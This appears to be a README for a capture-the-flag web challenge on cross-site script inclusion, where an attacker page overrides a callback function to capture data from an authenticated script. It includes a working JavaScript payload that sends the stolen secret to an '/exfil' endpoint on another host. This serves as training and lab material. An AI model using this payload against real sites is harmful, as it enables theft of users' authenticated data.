# xssi-medium (300 pts)

## Vulnerability: Cross-Site Script Inclusion (Function Callback Interception)

### Description
The victim web service generates an authenticated JavaScript resource at `http://victim.ctf:3000/api/userdata.js`:
```javascript
renderUserProfile(["admin", "sec_fn_...", "Security Operations"]);
```
Unlike variable assignment, this data is passed directly into a function call.

Before the script executes, the attacker's page on `http://attacker.ctf:8080` defines `window.renderUserProfile`:
```javascript
const jobId = new URLSearchParams(window.location.search).get('jobId');
window.renderUserProfile = function(dataArray) {
  fetch('http://portal.ctf:8000/exfil?jobId=' + encodeURIComponent(jobId) + '&secret=' + encodeURIComponent(dataArray[1]));
};
```
When the victim script loads, it invokes the attacker-controlled `renderUserProfile` function with its sensitive parameters, allowing immediate exfiltration and capture of the flag.

## Files
- `server.js`: Hosts victim app (port 3000) and bot portal (port 8000).
- `bot.js`: Headless Chrome bot runner.
- `public/`: Web UI for HTML payload submissions.
- `Dockerfile` & `docker-compose.yml`: Container setup.
- `challenge.yml`: CTFd configuration.
- `solve.py`: Automated solver / test verification script.

## Testing Locally
```bash
npm install
npm start
python solve.py
```
